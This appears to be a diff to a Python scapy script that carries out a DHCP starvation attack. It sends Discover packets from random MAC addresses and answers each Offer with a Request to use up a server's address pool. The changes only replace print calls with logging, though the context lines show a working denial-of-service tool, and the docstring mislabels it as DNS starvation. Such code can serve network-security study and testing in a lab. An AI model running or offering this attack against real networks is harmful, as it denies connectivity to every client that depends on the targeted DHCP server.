@@ -18,7 +18,9 @@ This script holds the code to perform DNS Starvation.
 	> Then, perform DHCP Request Packet after receiving the DHCP Offer Packet
 """
 
+import logging
 import multiprocessing as mp
+
 from scapy.all import *
 
 # UDP Port Number Protocol
@@ -40,6 +42,14 @@ ANS = 1
 
 # Sleep Time
 SLEEP_DURATION = 2
+
+# Logging Configuration
+LOG_FILE_DIR = os.path.abspath("logs/")
+logging.basicConfig(filename=LOG_FILE_DIR+"dns_poison.txt",
+                    filemode='wb',
+                    level=logging.DEBUG,
+                    format='%(asctime)s %(message)s', 
+                    datefmt='%d/%m/%Y %I:%M:%S %p')
 
 
 class DHCPStarvation(object):
@@ -78,9 +88,9 @@ def craft_dhcp_pkt():
                                 broadcast_ip=BROADCAST_IP,
                                 random_mac=random_mac)
 
-        print("[*] Sending DHCP Discover Packet ...")
+        logging.info("[*] Sending DHCP Discover Packet ...")
         packet.send_dhcp_dis_pkt()
-        print(f"[*] Sleeping for {SLEEP_DURATION} seconds ...")
+        logging.info(f"[*] Sleeping for {SLEEP_DURATION} seconds ...")
         time.sleep(SLEEP_DURATION)
 
 
@@ -112,7 +122,7 @@ def send_dhcp_req(pkt):
                     / DHCP(options=[('message-type', 'request'), ('server_id', pkt[DHCP].options[SERVER_ID][ANS]), ('requested_addr', pkt[BOOTP].yiaddr),'end'])
 
     sendp(dhcp_request, iface=IFACE, verbose=0)
-    print(f"[*] Successfully Starved Address: {pkt[BOOTP].yiaddr}")
+    logging.info(f"[*] Successfully Starved Address: {pkt[BOOTP].yiaddr}")
 
 
 def main():
@@ -123,7 +133,7 @@ def main():
 if __name__ == '__main__':
     p1 = mp.Process(target=main)
     p2 = mp.Process(target=craft_dhcp_pkt)
-    print("[*] Starting Program ...")
+    logging.info("[*] Starting Program ...")
     p1.start()
     p2.start()
 
